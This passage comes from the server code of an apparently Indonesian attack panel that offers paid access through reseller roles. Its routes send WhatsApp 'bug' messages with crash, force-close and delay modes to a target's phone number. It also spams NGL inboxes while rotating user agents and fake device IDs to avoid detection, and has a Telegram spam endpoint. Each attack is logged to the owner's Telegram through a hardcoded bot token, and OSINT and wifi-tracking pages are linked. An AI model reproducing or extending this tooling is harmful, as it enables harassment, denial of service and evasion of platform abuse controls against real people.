  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/chatai", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "chat.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/spam", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "telegram-spam.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/sender", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "sender.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/chat", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "Chatai.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/nsfw", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "nsfw.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/anime", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "anime.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/tools", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "tools.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/ping", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "wifi.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/yt", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "YouTube.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/osint", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "nikparse.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/tqto", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "tq.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/ngl", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "ngl.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/pin", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "pinterest.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/wifi", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "trackwifi.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});
      
/* 
USER DETECTIONS - HARAP DI BACA !!!
MASUKIN BOT TOKEN TELE LU DAN ID TELE LU ATAU ID GROUP TELEL LU

Gunanya buat apa bang?
itu kalo ada user yang make fitur bug nanti si bot bakal ngirim log history nya ke id telelu, kalo pake id GC tele lu, nanti ngirim history nya ke GC tele lu bisa lu atur aja mau ngirim nya ke mana ID / ID GC
*/
const BOT_TOKEN = "7903358806:AAFkZcHHbkehAmnL83F4D_LiaV-UdiKa4M8";
const CHAT_ID = "7250235697";
// simpan waktu terakhir eksekusi (global cooldown)
let lastExecution = 0;

// INI JANGAN DI APA APAIN
app.get("/execution", async (req, res) => {
  try {
    const username = req.cookies.sessionUser;

    // Jika tidak ada username, redirect ke login
    if (!username) {
      return res.redirect("/login?msg=Silakan login terlebih dahulu");
    }

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.redirect("/login?msg=Session expired, login ulang");
    }

    // Handle parameter dengan lebih baik
    const justExecuted = req.query.justExecuted === 'true';
    const targetNumber = req.query.target || '';
    const mode = req.query.mode || '';

    // Jika justExecuted=true, tampilkan halaman sukses
    if (justExecuted && targetNumber && mode) {
      const cleanTarget = targetNumber.replace(/\D/g, '');
      const country = getCountryCode(cleanTarget);
      
      return res.send(executionPage("✓ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()} - Completed - ${country}`
      }, false, currentUser, "", mode));
    }

    // Ambil session user yang aktif
    const userSessions = loadUserSessions();
    const userSenders = userSessions[username] || [];
    const activeUserSenders = userSenders.filter(sender => sessions.has(sender));
    
    console.log(`[INFO] User ${username} has ${activeUserSenders.length} active senders`);

    // Tampilkan halaman execution normal
    return res.send(executionPage("🟥 Ready", {
      message: "Masukkan nomor target dan pilih mode bug",
      activeSenders: activeUserSenders
    }, true, currentUser, "", mode));

  } catch (err) {
    console.error("❌ Fatal error di /execution:", err);
    return res.status(500).send("Internal Server Error");
  }
});

// INI BUAT PANGILAN KE FUNGSINYA
app.post("/execution", requireAuth, async (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    const { target, mode } = req.body;

    if (!target || !mode) {
      return res.status(400).json({ 
        success: false, 
        error: "Target dan mode harus diisi" 
      });
    }

    // Validasi format nomor internasional
    const cleanTarget = target.replace(/\D/g, '');
    
    // Validasi panjang nomor
    if (cleanTarget.length < 7 || cleanTarget.length > 15) {
      return res.status(400).json({
        success: false,
        error: "Panjang nomor harus antara 7-15 digit"
      });
    }

    // Validasi tidak boleh diawali 0
    if (cleanTarget.startsWith('0')) {
      return res.status(400).json({
        success: false,
        error: "Nomor tidak boleh diawali dengan 0. Gunakan format kode negara (contoh: 62, 1, 44, dll.)"
      });
    }

    // Cek session user
    const userSessions = loadUserSessions();
    const userSenders = userSessions[username] || [];
    const activeUserSenders = userSenders.filter(sender => sessions.has(sender));

    if (activeUserSenders.length === 0) {
      return res.status(400).json({
        success: false,
        error: "Tidak ada sender aktif. Silakan tambahkan sender terlebih dahulu."
      });
    }

    // Validasi mode bug
    const validModes = ["delay", "blank", "medium", "blank-ios", "fcinvsios", "force-close"];
    if (!validModes.includes(mode)) {
      return res.status(400).json({
        success: false,
        error: `Mode '${mode}' tidak valid. Mode yang tersedia: ${validModes.join(', ')}`
      });
    }

    // Eksekusi bug
    const userSender = activeUserSenders[0];
    const sock = sessions.get(userSender);
    
    if (!sock) {
      return res.status(400).json({
        success: false,
        error: "Sender tidak aktif. Silakan periksa koneksi sender."
      });
    }

    const targetJid = `${cleanTarget}@s.whatsapp.net`;
    const country = getCountryCode(cleanTarget);

    // HATI² HARUS FOKUS KALO MAU GANTI NAMA FUNGSI NYA
    let bugResult;
    try {
      if (mode === "delay") {
        bugResult = await delaylow(sock, 24, targetJid);
      } else if (mode === "medium") {
        bugResult = await delaylow(sock, 24, targetJid);
      } else if (mode === "crash") {
        bugResult = await androkill(sock, targetJid);
      } else if (mode === "blank-ios") {
        bugResult = await blankios(sock, targetJid);
      } else if (mode === "fcinvsios") {
        bugResult = await fcios(sock, targetJid);
      } else if (mode === "force-close") {
        bugResult = await androkill(sock, targetJid);
      }

      // Kirim log ke Telegram
      const logMessage = `<blockquote>⚡ <b>New Execution Success - International</b>
      
👤 User: ${username}
📞 Sender: ${userSender}
🎯 Target: ${cleanTarget} (${country})
📱 Mode: ${mode.toUpperCase()}
⏰ Time: ${new Date().toLocaleString("id-ID")}</blockquote>`;

      axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: logMessage,
        parse_mode: "HTML"
      }).catch(err => console.error("Gagal kirim log Telegram:", err.message));

      // Update global cooldown
      lastExecution = Date.now();

      res.json({ 
        success: true, 
        message: "Bug berhasil dikirim!",
        target: cleanTarget,
        mode: mode,
        country: country
      });

    } catch (error) {
      console.error(`[EXECUTION ERROR] User: ${username} | Error:`, error.message);
      res.status(500).json({
        success: false,
        error: `Gagal mengeksekusi bug: ${error.message}`
      });
    }

  } catch (error) {
    console.error("❌ Error in POST /execution:", error);
    res.status(500).json({
      success: false,
      error: "Terjadi kesalahan internal server"
    });
  }
});

// Route untuk serve HTML Telegram Spam

// API endpoint untuk spam Telegram
app.post('/api/telegram-spam', async (req, res) => {
    try {
        const username = req.cookies.sessionUser;
        if (!username) {
            return res.json({ success: false, error: 'Unauthorized' });
        }

        const { token, chatId, count, delay, mode } = req.body;
        
        if (!token || !chatId || !count || !delay || !mode) {
            return res.json({ success: false, error: 'Missing parameters' });
        }

        // Validasi input
        if (count > 1000) {
            return res.json({ success: false, error: 'Maximum count is 1000' });
        }

        if (delay < 100) {
            return res.json({ success: false, error: 'Minimum delay is 100ms' });
        }

        // Protected targets - tidak boleh diserang
        const protectedTargets = ['@mizukisnji', '7250235697'];
        if (protectedTargets.includes(chatId)) {
            return res.json({ success: false, error: 'Protected target cannot be attacked' });
        }

        // Kirim log ke Telegram owner
        const logMessage = `<blockquote>🔰 <b>New Telegram Spam Attack</b>
        
👤 User: ${username}
🎯 Target: ${chatId}
📱 Mode: ${mode.toUpperCase()}
🔢 Count: ${count}
⏰ Delay: ${delay}ms
🕐 Time: ${new Date().toLocaleString("id-ID")}</blockquote>`;

        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: logMessage,
                parse_mode: "HTML"
            });
        } catch (err) {
            console.error("Gagal kirim log Telegram:", err.message);
        }

        // Return success untuk trigger frontend
        res.json({ 
            success: true, 
            message: 'Attack started successfully',
            attackId: Date.now().toString()
        });

    } catch (error) {
        console.error('Telegram spam error:', error);
        res.json({ success: false, error: 'Internal server error' });
    }
});

// ============================================
const userTracking = {
  requests: new Map(), // Track per user
  targets: new Map(),  // Track per target
  
  // Reset otomatis tiap 24 jam
  resetDaily() {
    this.requests.clear();
    this.targets.clear();
    console.log('🔄 Daily tracking reset');
  },
  
  // Cek apakah user sudah melebihi limit harian
  canUserSend(userId, count) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    const current = this.requests.get(key) || 0;
    return current + count;
  },
  
  // Cek apakah target sudah melebihi limit harian
  canTargetReceive(target, count) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    const current = this.targets.get(key) || 0;
    return current + count;
  },
  
  // Update counter setelah berhasil kirim
  updateUser(userId, count) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    const current = this.requests.get(key) || 0;
    this.requests.set(key, current + count);
  },
  
  updateTarget(target, count) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    const current = this.targets.get(key) || 0;
    this.targets.set(key, current + count);
  },
  
  // Lihat statistik user
  getUserStats(userId) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    return this.requests.get(key) || 0;
  },
  
  // Lihat statistik target
  getTargetStats(target) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    return this.targets.get(key) || 0;
  }
};

// Auto-reset setiap 24 jam (midnight)
setInterval(() => {
  const now = new Date();
  if (now.getHours() === 0 && now.getMinutes() === 0) {
    userTracking.resetDaily();
  }
}, 60000); // Cek tiap 1 menit

// ============================================
// FUNGSI NGL SPAM - UPDATED
// ============================================
async function nglSpam(target, message, count) {
  const logs = [];
  let success = 0;
  let errors = 0;

  console.log(`🔍 Starting NGL spam to ${target}, message: ${message}, count: ${count}`);

  const sendNGLMessage = async (target, message, attempt) => {
    // Enhanced form data dengan field tambahan
    const formData = new URLSearchParams();
    formData.append('username', target);
    formData.append('question', message);
    formData.append('deviceId', generateEnhancedUUID());
    formData.append('gameSlug', '');
    formData.append('referrer', '');
    formData.append('timestamp', Date.now().toString());

    // Random delay yang lebih realistis
    if (attempt > 1) {
      const randomDelay = Math.floor(Math.random() * 4000) + 2000; // 2-6 detik
      await new Promise(resolve => setTimeout(resolve, randomDelay));
    }

    // Enhanced user agents
    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
      'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
    ];
    
    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

    try {
      console.log(`🔍 Attempt ${attempt} to ${target}`);
      
      const response = await axios.post('https://ngl.link/api/submit', formData, {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'User-Agent': randomUserAgent,
          'Accept': '*/*',
          'Accept-Language': 'en-US,en;q=0.9',
          'Origin': 'https://ngl.link',
          'Referer': `https://ngl.link/${target}`,
          'X-Requested-With': 'XMLHttpRequest',
          'Sec-Fetch-Dest': 'empty',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Site': 'same-origin'
        },
        timeout: 15000,
        validateStatus: function (status) {
          return status >= 200 && status < 500; // Terima semua status kecuali server errors
        }
      });

      console.log(`🔍 Response status: ${response.status}, data:`, response.data);

      // Enhanced response handling
      if (response.status === 200) {
        if (response.data && response.data.success !== false) {
          success++;
          logs.push(`[${attempt}/${count}] ✅ Berhasil dikirim ke ${target}`);
          return true;
        } else {
          errors++;
          logs.push(`[${attempt}/${count}] ⚠️ Response tidak valid: ${JSON.stringify(response.data)}`);
          return false;
        }
      } else if (response.status === 429) {
        errors++;
        logs.push(`[${attempt}/${count}] 🚫 Rate limited - tunggu beberapa saat`);
        // Tunggu lebih lama jika rate limited
        await new Promise(resolve => setTimeout(resolve, 10000));
        return false;
      } else {
        errors++;
        logs.push(`[${attempt}/${count}] ❌ HTTP ${response.status}: ${response.statusText}`);
        return false;
      }
    } catch (error) {
      errors++;
      console.error(`🔍 Error in attempt ${attempt}:`, error.message);
      
      if (error.response) {
        logs.push(`[${attempt}/${count}] ❌ HTTP ${error.response.status}: ${error.response.data?.message || error.response.statusText}`);
      } else if (error.request) {
        logs.push(`[${attempt}/${count}] ❌ Network Error: Tidak dapat terhubung ke server NGL`);
      } else {
        logs.push(`[${attempt}/${count}] ❌ Error: ${error.message}`);
      }
      
      return false;
    }
  };

  // Enhanced UUID generator
  function generateEnhancedUUID() {
    const timestamp = Date.now().toString(36);
    const random = Math.random().toString(36).substr(2, 9);
    return `web-${timestamp}-${random}`;
  }

  // Validasi input
  if (!target || !message || count <= 0) {
    throw new Error('Input tidak valid');
  }

  if (count > 50) { // Kurangi limit untuk menghindari detection
    throw new Error('Maksimal 50 pesan per request untuk menghindari detection');
  }

  // Jalankan spam
  logs.push(`🚀 Memulai spam ke: ${target}`);
  logs.push(`📝 Pesan: ${message}`);
  logs.push(`🔢 Jumlah: ${count} pesan`);
  logs.push(`⏳ Delay: 2-6 detik random antar pesan`);
  logs.push(`─`.repeat(40));

  for (let i = 0; i < count; i++) {
    const result = await sendNGLMessage(target, message, i + 1);
    
    // Jika rate limited, berhenti sementara
    if (i > 0 && i % 10 === 0) {
      logs.push(`⏸️  Istirahat sebentar setelah ${i} pesan...`);
      await new Promise(resolve => setTimeout(resolve, 10000));
    }
  }

  logs.push(`─`.repeat(40));
  logs.push(`📊 SELESAI! Sukses: ${success}, Gagal: ${errors}`);

  return { success, errors, logs };
}

// Helper function untuk generate UUID
function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    const r = Math.random() * 16 | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

// ============================================
// ROUTE NGL SPAM WEB - UPDATED dengan Info Limit
// ============================================

// ==================== NGL SPAM ROUTE ==================== //

// ============================================
// API ENDPOINT - UPDATED dengan Tracking System
// ============================================


// ✨ BONUS: Endpoint untuk cek target

app.post("/api/ngl-spam-js", requireAuth, async (req, res) => {
  const { target, message, count } = req.body;
  
  // Ambil user ID dari IP atau cookie
  const userId = req.ip || req.headers['x-forwarded-for'] || req.cookies.sessionUser || 'anonymous';
  
  // Hard limits
  const limits = {
    maxPerRequest: 100,      // Max 100 pesan per request
    minDelay: 3000,          // Minimal delay 3 detik
    maxDailyPerUser: 200,    // Max 200 pesan per user per hari
    maxDailyPerTarget: 100   // Max 100 pesan ke target yang sama
  };
  
  if (!target || !message || !count) {
    return res.status(400).json({ error: "Semua field harus diisi" });
  }

  // ✅ VALIDASI 1: Cek count tidak melebihi maxPerRequest
  if (count > limits.maxPerRequest) {
    return res.status(400).json({
      error: `❌ Untuk keamanan, maksimal ${limits.maxPerRequest} pesan per request`,
      currentCount: count,
      maxAllowed: limits.maxPerRequest
    });
  }

  if (count < 1) {
    return res.status(400).json({
      error: '❌ Jumlah pesan harus minimal 1'
    });
  }

  // ✅ VALIDASI 2: Cek limit harian user
  const userTotal = userTracking.canUserSend(userId, count);
  if (userTotal > limits.maxDailyPerUser) {
    const currentUsage = userTracking.getUserStats(userId);
    return res.status(429).json({
      error: '🚫 Limit harian tercapai!',
      message: `Kamu sudah kirim ${currentUsage} pesan hari ini. Limit: ${limits.maxDailyPerUser}/hari`,
      currentUsage: currentUsage,
      dailyLimit: limits.maxDailyPerUser,
      remaining: limits.maxDailyPerUser - currentUsage,
      resetTime: 'Midnight (00:00 WIB)'
    });
  }

  // ✅ VALIDASI 3: Cek limit harian target
  const targetTotal = userTracking.canTargetReceive(target, count);
  if (targetTotal > limits.maxDailyPerTarget) {
    const currentTargetUsage = userTracking.getTargetStats(target);
    return res.status(429).json({
      error: '🚫 Target sudah menerima terlalu banyak pesan!',
      message: `Target ${target} sudah terima ${currentTargetUsage} pesan hari ini. Limit: ${limits.maxDailyPerTarget}/hari`,
      currentTargetUsage: currentTargetUsage,
      targetDailyLimit: limits.maxDailyPerTarget,
      remaining: limits.maxDailyPerTarget - currentTargetUsage,
      resetTime: 'Midnight (00:00 WIB)'
    });
  }

  try {
    // Kirim pesan
    const result = await nglSpam(target, message, parseInt(count));
    
    // ✅ UPDATE TRACKING setelah berhasil
    userTracking.updateUser(userId, result.success);
    userTracking.updateTarget(target, result.success);
    
    // Kirim response dengan statistik
    res.json({
      ...result,
      stats: {
        userToday: userTracking.getUserStats(userId),
        userLimit: limits.maxDailyPerUser,
        targetToday: userTracking.getTargetStats(target),
        targetLimit: limits.maxDailyPerTarget,
        remaining: {
          user: limits.maxDailyPerUser - userTracking.getUserStats(userId),
          target: limits.maxDailyPerTarget - userTracking.getTargetStats(target)
        }
      }
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Route untuk TikTok (HANYA bisa diakses setelah login)
// Route untuk halaman My Senders
app.get("/my-senders", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "sender.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file sender.html:", err);
      return res.status(500).send("File sender.html tidak ditemukan");
    }
    res.send(html);
  });
});

// API untuk mendapatkan daftar sender user
app.get("/api/my-senders", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const userSessions = loadUserSessions();
  const userSenders = userSessions[username] || [];
  
  res.json({ 
    success: true, 
    senders: userSenders,
    total: userSenders.length
  });
});

// SSE endpoint untuk events real-time
app.get("/api/events", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Access-Control-Allow-Origin': '*',
  });

  // Simpan response object untuk user ini
  userEvents.set(username, res);

  // Kirim heartbeat setiap 30 detik
  const heartbeat = setInterval(() => {
    try {
      res.write(': heartbeat\n\n');
    } catch (err) {
      clearInterval(heartbeat);
    }
  }, 30000);

  // Cleanup saat connection close
  req.on('close', () => {
    clearInterval(heartbeat);
    userEvents.delete(username);
  });

  // Kirim event connection established
  res.write(`data: ${JSON.stringify({ type: 'connected', message: 'Event stream connected' })}\n\n`);
});

// API untuk menambah sender baru
app.post("/api/add-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }
  
  // Validasi nomor
  const cleanNumber = number.replace(/\D/g, '');
  if (!cleanNumber.startsWith('')) {
    return res.json({ success: false, error: "Nomor harus valid" });
  }
  
  if (cleanNumber.length < 7) {
    return res.json({ success: false, error: "Nomor terlalu pendek" });
  }
  
  try {
    console.log(`[API] User ${username} adding sender: ${cleanNumber}`);
    const sessionDir = userSessionPath(username, cleanNumber);
    
    // Langsung jalankan koneksi di background
    connectToWhatsAppUser(username, cleanNumber, sessionDir)
      .then((sock) => {
        console.log(`[${username}] ✅ Sender ${cleanNumber} connected successfully`);
        // Simpan socket ke map jika diperlukan
      })
      .catch((error) => {
        console.error(`[${username}] ❌ Failed to connect sender ${cleanNumber}:`, error.message);
      });

    res.json({ 
      success: true, 
      message: "Proses koneksi dimulai! Silakan tunggu notifikasi kode pairing.",
      number: cleanNumber,
      note: "Kode pairing akan muncul di halaman ini dalam beberapa detik..."
    });
    
  } catch (error) {
    console.error(`[API] Error adding sender for ${username}:`, error);
    res.json({ 
      success: false, 
      error: "Terjadi error saat memproses sender: " + error.message 
    });
  }
});

// API untuk menghapus sender
app.post("/api/delete-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }
  
  try {
    const userSessions = loadUserSessions();
    if (userSessions[username]) {
      userSessions[username] = userSessions[username].filter(n => n !== number);
      saveUserSessions(userSessions);
    }
    
    // Hapus folder session
    const sessionDir = userSessionPath(username, number);
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    }
    
    res.json({ 
      success: true, 
      message: "Sender berhasil dihapus",
      number: number
    });
  } catch (error) {
    res.json({ 
      success: false, 
      error: error.message 
    });
  }
});

// ============= User Add ================== \\
// GANTI kode route /adduser yang ada dengan yang ini:
app.post("/adduser", requireAuth, (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    const users = getUsers();
    const currentUser = users.find(u => u.username === username);
    
    if (!currentUser) {
      return res.redirect("/login?msg=User tidak ditemukan");
    }

    const sessionRole = currentUser.role || 'user';
    const { username: newUsername, password, role, durasi } = req.body;

    // Validasi input lengkap
    if (!newUsername || !password || !role || !durasi) {
      return res.send(`
        <script>
          alert("❌ Lengkapi semua kolom.");
          window.history.back();
        </script>
      `);
    }

    // Validasi durasi
    const durasiNumber = parseInt(durasi);
    if (isNaN(durasiNumber) || durasiNumber <= 0) {
      return res.send(`
        <script>
          alert("❌ Durasi harus angka positif.");
          window.history.back();
        </script>
      `);
    }

    // Cek hak akses berdasarkan role pembuat
    if (sessionRole === "user") {
      return res.send(`
        <script>
          alert("🚫 User tidak bisa membuat akun.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "reseller" && role !== "user") {
      return res.send(`
        <script>
          alert("🚫 Reseller hanya boleh membuat user biasa.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "admin" && role === "admin") {
      return res.send(`
        <script>
          alert("🚫 Admin tidak boleh membuat admin lain.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "admin" && role === "owner") {
      return res.send(`
        <script>
          alert("🚫 Admin tidak boleh membuat owner.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "reseller" && role === "owner") {
      return res.send(`
        <script>
          alert("🚫 Reseller tidak boleh membuat owner.");
          window.history.back();
        </script>
      `);
    }

    // Cek username sudah ada
    if (users.some(u => u.username === newUsername)) {
      return res.send(`
        <script>
          alert("❌ Username '${newUsername}' sudah terdaftar.");
          window.history.back();
        </script>
      `);
    }

    // Validasi panjang username dan password
    if (newUsername.length < 3) {
      return res.send(`
        <script>
          alert("❌ Username minimal 3 karakter.");
          window.history.back();
        </script>
      `);
    }

    if (password.length < 4) {
      return res.send(`
        <script>
          alert("❌ Password minimal 4 karakter.");
          window.history.back();
        </script>
      `);
    }

    const expired = Date.now() + (durasiNumber * 86400000);

    // Buat user baru
    const newUser = {
      username: newUsername,
      key: password,
      expired,
      role,
      telegram_id: "",
      isLoggedIn: false
    };

    users.push(newUser);
    
    // Simpan dan cek hasilnya
    const saveResult = saveUsers(users);
    
    if (!saveResult) {
      throw new Error("Gagal menyimpan data user ke file system");
    }

    // Redirect ke userlist dengan pesan sukses
    return res.redirect("/userlist?msg=User " + newUsername + " berhasil dibuat");

  } catch (error) {
    console.error("❌ Error in /adduser:", error);
    return res.send(`
      <script>
        alert("❌ Terjadi error saat menambahkan user: ${error.message}");
        window.history.back();
      </script>
    `);
  }
});

// TAMBAHKAN route ini SEBELUM route POST /adduser
app.get("/adduser", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';

  // Hanya owner, admin, reseller yang bisa akses
  if (!["owner", "admin", "reseller"].includes(role)) {
    return res.send("🚫 Akses ditolak. Hanya Owner, Admin, dan Reseller yang bisa menambah user.");
  }

  // Tentukan opsi role berdasarkan role current user
  let roleOptions = "";
  if (role === "owner") {
    roleOptions = `
      <option value="user">User</option>
      <option value="reseller">Reseller</option>
      <option value="admin">Admin</option>
      <option value="owner">Owner</option>
    `;
  } else if (role === "admin") {
    roleOptions = `
      <option value="user">User</option>
      <option value="reseller">Reseller</option>
    `;
  } else {
    // Reseller hanya bisa buat user biasa
    roleOptions = `<option value="user">User</option>`;
  }

  const html = `
  <!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Tambah User - DIGITAL CORE</title>
    <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Rajdhani:wght@500;600;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
    <style>
        :root {
            --neon-pink: #ff006e;
            --neon-cyan: #00f2ff;
            --bg-pure-black: #000000;
            --card-dark: #080808;
            --border-color: #1a1a1a;
        }

        * { 
            box-sizing: border-box; 
            margin: 0; 
            padding: 0; 
            -webkit-tap-highlight-color: transparent; 
        }

        body {
            font-family: 'Rajdhani', sans-serif;
            background: var(--bg-pure-black);
            color: #fff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
            /* Scanline Effect */
            background-image: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.4) 50%), 
                              linear-gradient(90deg, rgba(255, 0, 110, 0.03), rgba(0, 242, 255, 0.03));
            background-size: 100% 4px, 3px 100%;
        }

        #particles {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            z-index: 0;
            opacity: 0.4;
        }

        .content {
            position: relative;
            z-index: 2;
            width: 100%;
            max-width: 400px;
            padding: 20px;
        }

        /* Header Cyber */
        .header {
            text-align: left;
            margin-bottom: 20px;
            border-left: 3px solid var(--neon-pink);
            padding-left: 15px;
        }

        .header h2 {
            font-family: 'Orbitron', sans-serif;
            font-size: 20px;
            font-weight: 900;
            letter-spacing: 2px;
            text-transform: uppercase;
            color: #fff;
            text-shadow: 0 0 10px var(--neon-pink);
        }

        .header p {
            color: #666;
            font-size: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        /* Form Container */
        .form-container {
            background: var(--card-dark);
            border: 1px solid var(--border-color);
            padding: 25px;
            position: relative;
            box-shadow: 0 0 20px rgba(0,0,0,1);
        }

        /* Accent Corners */
        .form-container::before {
            content: '';
            position: absolute;
            top: -1px; right: -1px;
            width: 30px; height: 30px;
            background: linear-gradient(45deg, transparent 50%, var(--neon-cyan) 50%);
            clip-path: polygon(100% 0, 100% 100%, 0 0);
        }

        /* Login Info Box */
        .user-info {
            background: #000;
            padding: 12px;
            margin-bottom: 20px;
            border: 1px solid #111;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            margin-bottom: 4px;
        }

        .info-label { color: #444; text-transform: uppercase; font-weight: 700; }
        .info-value { color: var(--neon-cyan); font-family: 'Orbitron'; font-size: 11px; }

        .role-badge {
            padding: 1px 8px;
            font-size: 9px;
            font-family: 'Orbitron';
            font-weight: 900;
            text-transform: uppercase;
        }
        .role-owner { background: #FFD700; color: #000; }
